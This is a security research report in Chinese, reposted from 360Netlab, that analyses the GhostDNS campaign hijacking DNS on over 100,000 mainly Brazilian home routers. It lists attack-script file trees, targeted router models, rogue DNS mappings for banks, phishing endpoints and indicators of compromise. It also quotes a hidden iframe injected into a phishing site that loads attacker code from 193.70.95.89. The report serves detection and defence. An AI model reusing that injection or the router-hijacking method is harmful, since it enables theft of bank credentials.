> 原文链接: https://www.anquanke.com//post/id/161382 


# GhostDNS正在针对巴西地区70种、100,000+家用路由器做恶意DNS劫持


                                阅读量   
                                **137156**
                            
                        |
                        
                                                                                    



[![](https://p3.ssl.qhimg.com/t01a5926ceed592e85c.jpg)](https://p3.ssl.qhimg.com/t01a5926ceed592e85c.jpg)

## 背景介绍

从2018年9月20号开始，360Netlab Anglerfish蜜罐系统监测到互联网上有大量IP正在针对性地扫描路由器系统。攻击者尝试对路由器Web认证页面进行口令猜解或者通过dnscfg.cgi漏洞利用绕过身份认证，然后通过相应DNS配置接口篡改路由器默认DNS地址为Rogue DNS Server[[1]](https://en.wikipedia.org/wiki/DNS_hijacking) 。

我们共发现3套成熟的DNSChanger程序，根据其编程语言特性我们将它们分别命名为Shell DNSChanger，Js DNSChanger，PyPhp DNSChanger。目前这3套DNSChanger程序由同一个恶意软件团伙运营，其中以PyPhp DNChanger部署规模最大。根据其功能特性，我们将它们统一命名为DNSChanger System。

事实上DNSChanger System是该恶意软件软件团伙运营系统中的一个子系统，其它还包括：Phishing Web System，Web Admin System，Rogue DNS System。这4个系统之间相互协同运作实现DNS劫持功能，我们将这整个系统命名为GhostDNS。

我们发现一伙攻击者利用GhostDNS系统攻击了巴西地区超过 70 种、100,000 个家用路由器，通过篡改这些路由器上的配置，攻击者劫持了这些路由器的DNS解析，并进一步窃取了路由器用户在 50+ 网站上的登录凭证、银行帐号等信息。被劫持通信的网站主要涉及银行，云主机服务商等网站，其中也包括avira安全公司。



## GhostDNS系统

GhostDNS系统是由4个子系统组成，分别是：DNSChanger System，Phishing Web System，Web Admin System，Rogue DNS System等。其中DNSChanger System中主要包括信息搜集，漏洞利用等阶段，另外在3套DNSChanger程序中也会有不同的实现方式。

[![](https://blog.netlab.360.com/content/images/2018/10/ghostdns2.png)](https://blog.netlab.360.com/content/images/2018/10/ghostdns.png)



### DNSChanger System

DNSChanger System是GhostDNS的基础架构，攻击者通过3套DNSChanger程序，覆盖外网和内网攻击入口，包含 100+ 个攻击脚本，影响 70+ 款路由器型号。

[![](https://blog.netlab.360.com/content/images/2018/09/dnschanger-3.jpg)](https://blog.netlab.360.com/content/images/2018/09/dnschanger.jpg)



### Shell DNSChanger 分析

Shell DNSChanger最后一次更新时间在2016年6月左右，主要通过Shell 编写完成共涉及25个攻击脚本，可以感染21款路由器/固件。它的功能结构主要分为：扫描程序和攻击程序。攻击者目前对Shell DNSChanger程序部署量很少，基本已经淘汰了该程序。

攻击者采用了一款第三方程序 Fast HTTP Auth Scanner v0.6（FScan）作为扫描程序，同时配置了大量扫描规则,用户口令列表以及一些启动脚本。Fscan扫描IP范围是经过挑选的一个网段列表，同时这些网段IP大部分都归属于巴西。

攻击程序通过扫描程序搜集到的路由器设备信息，对这些路由器Web认证页面进行口令猜解，然后通过相应DNS配置接口篡改路由器默认DNS地址为Rogue DNS Server。

以下是Shell DNSChanger关键代码结构

```
├── brasil
├── changers
│   ├── 3com1
│   ├── aprouter
│   ├── dlink1
│   ├── dlink2
│   ├── dlink3
│   ├── dlink4
│   ├── dlink5
│   ├── dlink6
│   ├── dlink7
│   ├── dlink7_
│   ├── globaltronic
│   ├── huawei
│   ├── intelbrass
│   ├── kaiomy
│   ├── mikrotik
│   ├── oiwtech
│   ├── ralink
│   ├── realtek
│   ├── speedstream
│   ├── speedtouch
│   ├── speedtouch2
│   ├── tplink1
│   ├── tplink2
│   ├── tplink3
│   ├── triz
│   └── viking
├── configs
├── logs
├── mdetector
├── mikrotik
├── ralink
├── src
│   ├── BasicAuth.cpp
│   ├── Makefile
│   ├── Net-Telnet-3.03.tar.gz
│   ├── base64.cpp
│   ├── config.cpp
│   ├── fscan.cpp
│   ├── md5.cpp
│   ├── md5.h
│   ├── sockets.cpp
│   ├── sslscanner.h
│   ├── ulimit
│   └── webforms.cpp
├── .fscan
└── .timeout
```

以下是已识别受影响的路由器/固件

```
3COM OCR-812  
AP-ROUTER  
D-LINK  
D-LINK DSL-2640T  
D-LINK DSL-2740R  
D-LINK DSL-500  
D-LINK DSL-500G/DSL-502G  
Huawei SmartAX MT880a  
Intelbras WRN240-1  
Kaiomy Router  
MikroTiK Routers  
OIWTECH OIW-2415CPE  
Ralink Routers  
SpeedStream  
SpeedTouch  
Tenda  
TP-LINK TD-W8901G/TD-W8961ND/TD-8816  
TP-LINK TD-W8960N  
TP-LINK TL-WR740N  
TRIZ TZ5500E/VIKING  
VIKING/DSLINK 200 U/E
```

### Js DNSChanger 分析

Js DNSChanger主要通过Java Script编写完成共涉及10个攻击脚本，可以感染6款路由器/固件。它的功能结构主要分为扫描程序，Payload生成器和攻击程序。Js DNSChanger程序一般会注入到一些钓鱼网站代码中，和Pishing Web System协同工作。

我们在 35.236.25.247（网站标题为：Convertidor Youtube Mp3 | Mp3 youtube）首页发现了Js DNSChanger代码。

```
&lt;iframe src="http://193.70.95.89/2021/"  frameborder="0" height="0" scrolling="no" title="no" width="0"&gt;&lt;/iframe&gt;
```

攻击者通过Image()函数对一个预定义的内网IP地址进行端口扫描，如果检测到端口开放会将该内网IP上报给Payload生成器。

```
#扫描程序
http://193.70.95.89/2021/index2.php  
```

Payload生成器会根据路由器IP和Rogue DNS IP生成相应Base64编码的Payload，然后通过Data URI Scheme形式运行相应HTML代码。

```
#Payload生成器
http://193.70.95.89/2021/api.init.php?d=192.168.1.1  
```

攻击程序通过jQuery.ajax构造相应Http请求，对这些路由器Web认证页面进行口令猜解，然后通过相应DNS配置接口篡改路由器默认DNS地址为Rogue DNS Server。

以下是Js DNSChanger部分代码结构：

```
├── api.init.php
├── index.php
└── index2.php
```

以下是已识别受影响的路由器/固件

```
A-Link WL54AP3 / WL54AP2  
D-Link DIR-905L  
Roteador GWR-120  
Secutech RiS Firmware  
SMARTGATE  
TP-Link TL-WR841N / TL-WR841ND
```

以下是其扫描IP范围

```
192.168.0.1  
192.168.15.1  
192.168.1.1  
192.168.25.1  
192.168.100.1  
10.0.0.1  
192.168.2.1
```

### PyPhp DNSChanger 分析

PyPhp DNSChanger程序在2018年4月26号左右完成开发，主要通过python和php编写完成，共涉及 69 个攻击脚本，可以感染 47 款路由器/固件。它的功能结构主要分为Web API，扫描程序和攻击程序。攻击者一般会在云服务器部署大量PyPhp DNSChanger程序实例，这也是攻击采用的DNSChanger主要攻击手段。我们已累计发现 100+ PyPhp DNSChanger扫描节点，其中有大量IP位于Google云。

Web API是和Admin Web System通信的接口，攻击者可以通过它控制各个扫描节点，比如执行扫描任务等。

扫描程序包括Masscan端口扫描和利用Shodan API筛选banner特征获取到相应路由器设备IP信息。Masscan扫描IP范围是经过挑选的一个网段列表，这些网段IP大部分都归属于巴西。另外Shodan API搜索条件也限制了只搜索巴西国家。

有意思的是我们在Github上发现一个项目跟攻击者使用相同的Shodan API Key，并且这个Key是属于教育研究用途，但我们不确定这个Shodan API Key是否因泄漏而导致被攻击者利用。

以下是攻击者使用的Shodan API Key信息

```
API key: LI****Lg9P8****X5iy****AaRO  
Created: 2017-11-03T16:55:13.425000  
Plan: EDU
```

攻击程序会根据扫描程序搜集到的路由器IP信息，对这些路由器Web认证页面进行口令猜解或者通过dnscfg.cgi漏洞利用绕过身份认证，然后通过相应DNS配置接口篡改路由器默认DNS地址为Rogue DNS Server。

另外，PyPhp DNSChanger程序还存在感染成功统计页面，可以清楚地看到每个扫描节点的感染情况。

[![](https://blog.netlab.360.com/content/images/2018/09/log.png)](https://blog.netlab.360.com/content/images/2018/09/log.png)



```
├── api
├── application
│   ├── class
│   │   ├── routers
│   │   │   ├── routers.28ZE.php
│   │   │   ├── routers.AN5506-02-B.php
│   │   │   ├── routers.ELSYSCPE-2N.php
│   │   │   ├── routers.PQWS2401.php
│   │   │   ├── routers.TLWR840N.php
│   │   │   ├── routers.WR941ND.php
│   │   │   ├── routers.airos.php
│   │   │   ├── routers.c3t.php
│   │   │   ├── routers.cisconew.php
│   │   │   ├── routers.dlink.905.php
│   │   │   ├── routers.dlink.dir600.php
│   │   │   ├── routers.dlink.dir610.php
│   │   │   ├── routers.dlink.dir610o.php
│   │   │   ├── routers.dlink.dir615.php
│   │   │   ├── routers.fiberhome.php
│   │   │   ├── routers.fiberhomenew.php
│   │   │   ├── routers.ghotanboa.php
│   │   │   ├── routers.goahed.php
│   │   │   ├── routers.greatek.php
│   │   │   ├── routers.greatek2.php
│   │   │   ├── routers.gwr120.php
│   │   │   ├── routers.huawei.php
│   │   │   ├── routers.intelbras.php
│   │   │   ├── routers.intelbras.wrn240.php
│   │   │   ├── routers.intelbras.wrn300.php
│   │   │   ├── routers.intelbrasN150.php
│   │   │   ├── routers.linkone.php
│   │   │   ├── routers.livetimdslbasic.php
│   │   │   ├── routers.livetimsagecom.php
│   │   │   ├── routers.mikrotkit.php
│   │   │   ├── routers.multilaser.php
│   │   │   ├── routers.oiwtech.php
│   │   │   ├── routers.othermodels.php
│   │   │   ├── routers.sharecenter.php
│   │   │   ├── routers.thomson.php
│   │   │   ├── routers.timdsl.php
│   │   │   ├── routers.timvmg3312.php
│   │   │   ├── routers.wirelessnrouter.php
│   │   │   ├── routers.wrn1043nd.php
│   │   │   ├── routers.wrn342.php
│   │   │   ├── routers.wrn720n.php
│   │   │   ├── routers.wrn740n.php
│   │   │   ├── routers.wrn749n.php
│   │   │   ├── routers.wrn840n.php
│   │   │   ├── routers.wrn841n.php
│   │   │   └── routers.wrn845n.php
│   │   ├── routers_py
│   │   │   ├── WR300build8333.py
│   │   │   ├── install.sh
│   │   │   ├── router.ArcherC7.py
│   │   │   ├── router.FiberLink101.py
│   │   │   ├── router.GEPONONU.py
│   │   │   ├── router.PNRT150M.py
│   │   │   ├── router.QBR1041WU.py
│   │   │   ├── router.RoteadorWirelessN300Mbps.py
│   │   │   ├── router.SAPIDORB1830.py
│   │   │   ├── router.TENDAWirelessNBroadbandrouter.py
│   │   │   ├── router.TLWR840N.py
│   │   │   ├── router.TLWR841N.py
│   │   │   ├── router.TLWR849N.py
│   │   │   ├── router.TPLINKWR841N.py
│   │   │   ├── router.TechnicLanWAR54GSv2.py
│   │   │   ├── router.TendaWirelessRouter.py
│   │   │   ├── router.WEBManagementSystem.py
│   │   │   ├── router.WLANBroadbandRouter.py
│   │   │   ├── router.WebUI.py
│   │   │   ├── router.WirelessNWRN150R.py
│   │   │   ├── router.WirelessRouter.py
│   │   │   ├── router.WiveNGMTrouterfirmware.py
│   │   │   ├── router.ZXHNH208N.py
│   │   │   └── scan
│   │   │       ├── __init__.py
│   │   │       └── password.py
│   │   ├── scanner
│   │   │   └── class.scanner.utils.php
│   │   ├── shodan
│   │   │   ├── class.shodan.php
│   │   │   └── cookie.txt
│   │   ├── utils
│   │   │   ├── class.colors.php
│   │   │   ├── class.utils.php
│   │   │   └── class.webrequest.php
│   │   └── web
│   │       ├── blockedtitles
│   │       ├── class.web.api.php
│   │       └── class.web.interface.php
│   ├── config.bruteforce.php
│   ├── config.init.php
│   ├── config.layout.php
│   ├── config.rangelist - bkp.php
│   ├── config.rangelist.php
│   ├── config.routers.php
│   ├── config.scanner.php
│   ├── launchers
│   │   └── attack
│   │       └── launch
│   └── logs
├── logs
│   ├── change.log
│   └── gravar.php
├── parse_logs
└── scanner
    ├── api.php
    ├── extrator.php
    ├── ranged_scanner.php
    ├── rodar.php
    ├── rodarlista.php
    ├── shodan.php
    └── teste.py
```

以下是已识别受影响的路由器/固件

```
AirRouter AirOS  
Antena PQWS2401  
C3-TECH Router  
Cisco Router  
D-Link DIR-600  
D-Link DIR-610  
D-Link DIR-615  
D-Link DIR-905L  
D-Link ShareCenter  
Elsys CPE-2n  
Fiberhome  
Fiberhome AN5506-02-B  
Fiberlink 101  
GPON ONU  
Greatek  
GWR 120  
Huawei  
Intelbras WRN 150  
Intelbras WRN 240  
Intelbras WRN 300  
LINKONE  
MikroTik  
Multilaser  
OIWTECH  
PFTP-WR300  
QBR-1041 WU  
Roteador PNRT150M  
Roteador Wireless N 300Mbps  
Roteador WRN150  
Roteador WRN342  
Sapido RB-1830  
TECHNIC LAN WAR-54GS  
Tenda Wireless-N Broadband Router  
Thomson  
TP-Link Archer C7  
TP-Link TL-WR1043ND  
TP-Link TL-WR720N  
TP-Link TL-WR740N  
TP-Link TL-WR749N  
TP-Link TL-WR840N  
TP-Link TL-WR841N  
TP-Link TL-WR845N  
TP-Link TL-WR849N  
TP-Link TL-WR941ND  
Wive-NG routers firmware  
ZXHN H208N  
Zyxel VMG3312
```

### Web Admin System

我们对这个系统所了解的信息比较少，但是能够确认它是属于Web Admin System，并且跟PyPhp DNSChanger协同工作。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://blog.netlab.360.com/content/images/2018/09/webadmin.png)



以下是Web Admin Server地址

```
198.50.222.139    "AS16276 OVH SAS"
```

### Rogue DNS System

通过对Rogue DNS Server（139.60.162.188）碰撞检测，我们共发现它劫持了52个域名，主要涉及银行，云主机服务商等网站，其中也包括avira安全公司。

以下是Rogue DNS Server（139.60.162.188）劫持细节

```
`{`"domain": "avira.com.br", "rdata": ["0.0.0.0"]`}`
`{`"domain": "banco.bradesco", "rdata": ["198.27.121.241"]`}`
`{`"domain": "bancobrasil.com.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "bancodobrasil.com.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "bb.com.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "bradesco.com.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "bradesconetempresa.b.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "bradescopj.com.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "br.wordpress.com", "rdata": ["193.70.95.89"]`}`
`{`"domain": "caixa.gov.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "citibank.com.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "clickconta.com.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "contasuper.com.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "credicard.com.br", "rdata": ["198.27.121.241"]`}`
`{`"domain": "hostgator.com.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "itau.com.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "itaupersonnalite.com.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "kinghost.com.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "locaweb.com.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "netflix.com.br", "rdata": ["35.237.127.167"]`}`
`{`"domain": "netflix.com", "rdata": ["35.237.127.167"]`}`
`{`"domain": "painelhost.uol.com.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "santander.com.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "santandernet.com.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "sicredi.com.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "superdigital.com.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "umbler.com", "rdata": ["193.70.95.89"]`}`
`{`"domain": "uolhost.uol.com.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "www.banco.bradesco", "rdata": ["198.27.121.241"]`}`
`{`"domain": "www.bancobrasil.com.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "www.bb.com.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "www.bradesco.com.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "www.bradesconetempresa.b.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "www.bradescopj.com.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "www.br.wordpress.com", "rdata": ["193.70.95.89"]`}`
`{`"domain": "www.caixa.gov.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "www.citibank.com.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "www.credicard.com.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "www.hostgator.com.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "www.itau.com.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "www.kinghost.com.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "www.locaweb.com.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "www.netflix.com", "rdata": ["193.70.95.89"]`}`
`{`"domain": "www.netflix.net", "rdata": ["193.70.95.89"]`}`
`{`"domain": "www.painelhost.uol.com.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "www.santander.com.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "www.santandernet.com.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "www.sicredi.com.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "www.superdigital.com.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "www.umbler.com", "rdata": ["193.70.95.89"]`}`
`{`"domain": "www.uolhost.com.br", "rdata": ["193.70.95.89"]`}`
`{`"domain": "www.uolhost.uol.com.br", "rdata": ["193.70.95.89"]`}`
```

以下是其它Rogue DNS Server列表

```
139.60.162.188       "AS395839 HOSTKEY"  
139.60.162.201       "AS395839 HOSTKEY"  
144.22.104.185       "AS7160 Oracle Corporation"  
173.82.168.104       "AS35916 MULTACOM CORPORATION"  
18.223.2.98          "AS16509 Amazon.com, Inc."  
185.70.186.4         "AS57043 Hostkey B.v."  
192.99.187.193       "AS16276 OVH SAS"  
198.27.121.241       "AS16276 OVH SAS"  
200.196.240.104      "AS11419 Telefonica Data S.A."  
200.196.240.120      "AS11419 Telefonica Data S.A."  
35.185.9.164         "AS15169 Google LLC"  
80.211.37.41         "AS31034 Aruba S.p.A."
```

### Phishing Web System

Pishing Web System 需要跟Rogue DNS System协同工作，Rogue DNS Server会修改特定域名的A记录解析结果并返回一个Pishing Web Server地址，然后根据受害者请求的Hostname引导至相应的钓鱼网站程序。

通过对193.70.95.89所劫持的域名进行访问，我们发现攻击者克隆了相应官方网站的首页，并篡改了登录表单提交链接为Pishing Web API接口。然后我们对这些钓鱼网站首页进行指纹识别，计算首页文件md5，共检测到 19 款钓鱼网站程序。

以下是钓鱼程序列表：

```
md5, url, hostname, pishing web api  
42c3c9b4207b930b414dd6bd64335945 http://193.70.95.89 itau.com.br ['http://193.70.95.89/processar1.php']  
42c3c9b4207b930b414dd6bd64335945 http://193.70.95.89 itaupersonnalite.com.br ['http://193.70.95.89/processar1.php']  
42c3c9b4207b930b414dd6bd64335945 http://193.70.95.89 www.itau.com.br ['http://193.70.95.89/processar1.php']  
4398ceb11b79cbf49a9d300095923382 http://193.70.95.89/login.php umbler.com ['http://193.70.95.89/processa_1.php']  
4398ceb11b79cbf49a9d300095923382 http://193.70.95.89/login.php www.umbler.com ['http://193.70.95.89/processa_1.php']  
492188f294d0adeb309b4d2dd076f1ac http://193.70.95.89 www.credicard.com.br ['http://193.70.95.89/acesso.php']  
492c7af618bd8dcbc791037548f1f8e6 http://193.70.95.89 sicredi.com.br ['http://193.70.95.89/salvar.php']  
492c7af618bd8dcbc791037548f1f8e6 http://193.70.95.89 www.sicredi.com.br ['http://193.70.95.89/salvar.php']  
5838b749436a5730b0112a81d6818915 http://193.70.95.89 bradesconetempresa.b.br ['http://193.70.95.89/processa_2.php', 'http://193.70.95.89/enviar_certificado_1.php']  
70b8d0f46502d34ab376a02eab8b5ad7 http://193.70.95.89/default.html locaweb.com.br ['http://193.70.95.89/salvar.php']  
70b8d0f46502d34ab376a02eab8b5ad7 http://193.70.95.89/default.html www.locaweb.com.br ['http://193.70.95.89/salvar.php']  
748322f4b63efbb9032d52e60a87837d http://193.70.95.89/login.html bancobrasil.com.br ['http://193.70.95.89/processar_1.php']  
748322f4b63efbb9032d52e60a87837d http://193.70.95.89/login.html bancodobrasil.com.br ['http://193.70.95.89/processar_1.php']  
748322f4b63efbb9032d52e60a87837d http://193.70.95.89/login.html bb.com.br ['http://193.70.95.89/processar_1.php']  
748322f4b63efbb9032d52e60a87837d http://193.70.95.89/login.html www.bancobrasil.com.br ['http://193.70.95.89/processar_1.php']  
748322f4b63efbb9032d52e60a87837d http://193.70.95.89/login.html www.bb.com.br ['http://193.70.95.89/processar_1.php']  
8e94b7700dde45fbb42cdecb9ca3ac4e http://193.70.95.89/BRGCB/JPS/portal/Index.do.shtml citibank.com.br ['http://193.70.95.89/BRGCB/JPS/portal/Home.do.php']  
8e94b7700dde45fbb42cdecb9ca3ac4e http://193.70.95.89/BRGCB/JPS/portal/Index.do.shtml www.citibank.com.br ['http://193.70.95.89/BRGCB/JPS/portal/Home.do.php']  
97c8abea16e96fe1222d44962d6a7f89 http://193.70.95.89 www.bradesco.com.br ['http://193.70.95.89/identificacao.php']  
9882ea325c529bf75cf95d0935b4dba0 http://193.70.95.89 www.bradescopj.com.br ['http://193.70.95.89/processa_2.php', 'http://193.70.95.89/enviar_certificado_1.php']  
a80dbfbca39755657819f6a188c639e3 http://193.70.95.89/login.php painelhost.uol.com.br ['http://193.70.95.89/processa_1.php']  
a80dbfbca39755657819f6a188c639e3 http://193.70.95.89/login.php uolhost.uol.com.br ['http://193.70.95.89/processa_1.php']  
a80dbfbca39755657819f6a188c639e3 http://193.70.95.89/login.php www.painelhost.uol.com.br ['http://193.70.95.89/processa_1.php']  
a80dbfbca39755657819f6a188c639e3 http://193.70.95.89/login.php www.uolhost.com.br ['http://193.70.95.89/processa_1.php']  
a80dbfbca39755657819f6a188c639e3 http://193.70.95.89/login.php www.uolhost.uol.com.br ['http://193.70.95.89/processa_1.php']  
abcfef26e244c96a16a4577c84004a8f http://193.70.95.89 santander.com.br ['http://193.70.95.89/processar_pj_1.php', 'http://193.70.95.89/processar_1.php']  
abcfef26e244c96a16a4577c84004a8f http://193.70.95.89 santandernet.com.br ['http://193.70.95.89/processar_pj_1.php', 'http://193.70.95.89/processar_1.php']  
abcfef26e244c96a16a4577c84004a8f http://193.70.95.89 www.santander.com.br ['http://193.70.95.89/processar_pj_1.php', 'http://193.70.95.89/processar_1.php']  
abcfef26e244c96a16a4577c84004a8f http://193.70.95.89 www.santandernet.com.br ['http://193.70.95.89/processar_pj_1.php', 'http://193.70.95.89/processar_1.php']  
cf8591654e638917e3f1fb16cf7980e1 http://193.70.95.89 contasuper.com.br ['http://193.70.95.89/processar_1.php']  
cf8591654e638917e3f1fb16cf7980e1 http://193.70.95.89 superdigital.com.br ['http://193.70.95.89/processar_1.php']  
cf8591654e638917e3f1fb16cf7980e1 http://193.70.95.89 www.superdigital.com.br ['http://193.70.95.89/processar_1.php']  
d01f5b9171816871a3c1d430d255591b http://193.70.95.89 www.bradesconetempresa.b.br ['http://193.70.95.89/processa_2.php', 'http://193.70.95.89/enviar_certificado_1.php']  
f71361a52cc47e2b19ec989c3c5af662 http://193.70.95.89 kinghost.com.br ['http://193.70.95.89/processa_1.php']  
f71361a52cc47e2b19ec989c3c5af662 http://193.70.95.89 www.kinghost.com.br ['http://193.70.95.89/processa_1.php']  
fbb4691da52a63baaf1c8fc2f4cb5d2d http://193.70.95.89 www.netflix.com ['http://193.70.95.89/envio.php']  
ffd3708c786fbb5cfa239a79b45fe45b http://193.70.95.89 bradescopj.com.br ['http://193.70.95.89/processa_2.php', 'http://193.70.95.89/enviar_certificado_1.php']  
ffecab7ab327133580f607112760a7e2 http://193.70.95.89 clickconta.com.br ['http://193.70.95.89/identificacao.php']
```

以下是其它Phishing Web Server列表

```
193.70.95.89    "AS16276 OVH SAS"  
198.27.121.241    "AS16276 OVH SAS"  
35.237.127.167    "AS15169 Google LLC"
```

### 被感染的路由器信息

通过9月21号～9月27号的GhostDNS系统日志，我们观察到其已经感染了 100k+ 个路由器IP地址，70+ 款路由器型号。根据国家进行统计巴西占比87.8%。由于路由器设备IP地址会动态更新，实际设备数会有所不同。

[![](https://blog.netlab.360.com/content/images/2018/09/victims.png)](https://blog.netlab.360.com/content/images/2018/09/victims.png)



```
BR 91605  
BO 7644  
AR 2581  
SX 339  
MX 265  
VE 219  
US 191  
UY 189  
CL 138  
CO 134  
GT 80  
EC 71  
GY 70  
RU 61  
RO 51  
PY 38  
PA 35  
UA 34  
HN 33  
BG 33
```

以下是感染成功的路由器Web管理页面title列表

```
28ZE  
ADSL2 PLUS  
AIROS  
AN550602B  
BaseDashboard  
C3T Routers  
DIR600 1  
DIR-615 DLINK  
Dlink DIR-610  
Dlink DIR-611  
DLINK DIR-905L  
DSL Router  
DSL Router - GKM 1220  
ELSYS CPE-2N  
FiberHome AN5506-02-B, hardware: GJ-2.134.321B7G, firmware: RP2520  
FiberLink101  
GoAhead-Boa  
GoAhead-Webs  
GoAhead-Webs Routers  
GoAhed 302  
GOTHAN  
GREATEK  
GWR-120  
KP8696X  
Link One  
Mini_httpd  
Multilaser Router  
OIWTECH  
Proqualit Router  
Realtek Semiconductor  
Realtek Semiconductor [Title]  
Roteador ADSL  
Roteador Wireless KLR 300N  
Roteador Wireless N 150Mbps  
Roteador Wireless N 150 Mbps  
Roteador Wireless N 300 Mbps  
Roteador Wireless N 300 Mbps [ LinkOne ]  
Roteador Wireless N 300 Mbps [Link One]  
Roteador Wireless N ( MultiLaser )  
Roteador Wireless N [ MultiLaser ]  
TENDA  
TimDSL  
TL-WR740N / TL-WR741ND  
TL-WR840N  
TL-WR849N  
TP-LINK Nano WR702N  
TP-LINK Roteador Wireless  
TP-LINK Roteador Wireless N WR741ND  
TP-LINK TL-WR941HP  
TP-LINK Wireless AP WA5210G  
TP-LINK Wireless Lite N Router WR740N  
TP-LINK Wireless Lite N Router WR749N  
TP-LINK Wireless N Gigabit Router WR1043ND  
TP-LINK Wireless N Router WR841N/WR841ND  
TP-LINK Wireless N Router WR845N  
TP-LINK Wireless N Router WR941ND  
TP-LINK Wireless Router  
TP-LINK WR340G  
TP-LINK WR720N  
TP-LINK WR740N  
TP-LINK WR741N  
TP-LINK WR743ND  
TP-LINK WR840N  
TP-LINK WR841HP  
TP-LINK WR841N  
TP-LINK WR940N  
TP-LINK WR941N  
TP-LINK WR949N  
Wireless-N Router  
Wireless Router  
WLAN AP Webserver  
ZNID
```



## 总结

GhostDNS攻击程序和攻击入口多样性，攻击流程自动化，规模化，已经对互联网造成严重的安全威胁。

我们特别建议巴西家庭宽带用户及时更新路由器软件系统，检查路由器DNS地址是否已经被篡改，同时给路由器Web设置复杂的登录凭证。

我们建议相关路由器厂商提升初始密码复杂度，同时建立完善的软件系统安全更新机制。

相关安全和执法机构，可以邮件联系netlab[at]360.cn获取被感染的IP地址列表。

### 联系我们

感兴趣的读者，可以在 [twitter](https://twitter.com/360Netlab) 或者在微信公众号 360Netlab 上联系我们。

### IoC list

```
#Pishing Web Server
[takendown] 193.70.95.89                 "AS16276 OVH SAS"
[takendown] 198.27.121.241               "AS16276 OVH SAS"
[takendown] 35.237.127.167               "AS15169 Google LLC"

#Rogue DNS Server
139.60.162.188               "AS395839 HOSTKEY"  
139.60.162.201               "AS395839 HOSTKEY"  
173.82.168.104               "AS35916 MULTACOM CORPORATION"  
18.223.2.98                  "AS16509 Amazon.com, Inc."  
185.70.186.4                 "AS57043 Hostkey B.v."  
200.196.240.104              "AS11419 Telefonica Data S.A."  
200.196.240.120              "AS11419 Telefonica Data S.A."  
80.211.37.41                 "AS31034 Aruba S.p.A."  
[takendown] 35.185.9.164                 "AS15169 Google LLC"
[takendown] 144.22.104.185               "AS7160 Oracle Corporation"
[takendown] 192.99.187.193               "AS16276 OVH SAS"
[takendown] 198.27.121.241               "AS16276 OVH SAS"

#Web Admin Server
[takendown] 198.50.222.139              "AS16276 OVH SAS"


#DNSChanger Scanner Server
[takendown] 104.196.177.180              "AS15169 Google LLC"
[takendown] 104.196.232.200              "AS15169 Google LLC"
[takendown] 104.197.106.6                "AS15169 Google LLC"
[takendown] 104.198.54.181               "AS15169 Google LLC"
[takendown] 104.198.77.60                "AS15169 Google LLC"
[takendown] 198.50.222.139               "AS16276 OVH SAS"
[takendown] 35.185.127.39                "AS15169 Google LLC"
[takendown] 35.185.9.164                 "AS15169 Google LLC"
[takendown] 35.187.149.224               "AS15169 Google LLC"
[takendown] 35.187.202.208               "AS15169 Google LLC"
[takendown] 35.187.238.80                "AS15169 Google LLC"
[takendown] 35.188.134.185               "AS15169 Google LLC"
[takendown] 35.189.101.217               "AS15169 Google LLC"
[takendown] 35.189.125.149               "AS15169 Google LLC"
[takendown] 35.189.30.127                "AS15169 Google LLC"
[takendown] 35.189.59.155                "AS15169 Google LLC"
[takendown] 35.189.63.168                "AS15169 Google LLC"
[takendown] 35.189.92.68                 "AS15169 Google LLC"
[takendown] 35.194.197.94                "AS15169 Google LLC"
[takendown] 35.195.116.90                "AS15169 Google LLC"
[takendown] 35.195.176.44                "AS15169 Google LLC"
[takendown] 35.196.101.227               "AS15169 Google LLC"
[takendown] 35.197.148.253               "AS15169 Google LLC"
[takendown] 35.197.172.214               "AS15169 Google LLC"
[takendown] 35.198.11.42                 "AS15169 Google LLC"
[takendown] 35.198.31.197                "AS15169 Google LLC"
[takendown] 35.198.5.34                  "AS15169 Google LLC"
[takendown] 35.198.56.227                "AS15169 Google LLC"
[takendown] 35.199.106.0                 "AS15169 Google LLC"
[takendown] 35.199.2.186                 "AS15169 Google LLC"
[takendown] 35.199.61.19                 "AS15169 Google LLC"
[takendown] 35.199.66.147                "AS15169 Google LLC"
[takendown] 35.199.77.82                 "AS15169 Google LLC"
[takendown] 35.200.179.26                "AS15169 Google LLC"
[takendown] 35.200.28.69                 "AS15169 Google LLC"
[takendown] 35.203.111.239               "AS15169 Google LLC"
[takendown] 35.203.135.65                "AS15169 Google LLC"
